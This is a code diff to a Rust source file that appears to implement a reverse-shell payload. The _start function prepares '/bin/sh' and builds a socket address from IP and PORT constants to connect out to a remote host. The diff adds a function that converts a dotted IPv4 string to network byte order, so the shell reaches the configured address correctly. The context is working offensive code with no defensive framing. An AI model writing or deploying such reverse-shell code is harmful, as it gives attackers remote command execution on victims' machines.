@@ -112,16 +112,28 @@ pub unsafe fn exit(ret: usize) -> ! {
     );
 }
 
+pub fn ip_str_to_beu32(ipv4_str: &str) -> u32 {
+    let ip_it = ipv4_str.split('.');
+    let mut r = [0u8; 4];
+    for (idx, b) in ip_it.enumerate() {
+        r[idx] = b.parse::<u8>().unwrap()
+    }
+    let mut res = (r[0] as u32) << 24;
+    res |= (r[1] as u32) << 16;
+    res |= (r[2] as u32) << 8;
+    res |= r[3] as u32;
+    res.to_be()
+}
+
 #[no_mangle]
 fn _start() -> ! {
     let shell: &str = "/bin/sh\x00";
     let argv: [*const &str; 2] = [&shell, core::ptr::null()];
+    let ip: u32 = ip_str_to_beu32(IP);
     let socket_addr = sockaddr_in {
         sin_family: AF_INET as u16,
         sin_port: PORT.parse::<u16>().unwrap().to_be(),
-        sin_addr: in_addr {
-            s_addr: IP.parse::<u32>().unwrap().to_be(),
-        },
+        sin_addr: in_addr { s_addr: ip },
         sin_zero: [0; 8],
     };
     let socket_addr_len = core::mem::size_of::<sockaddr_in>();
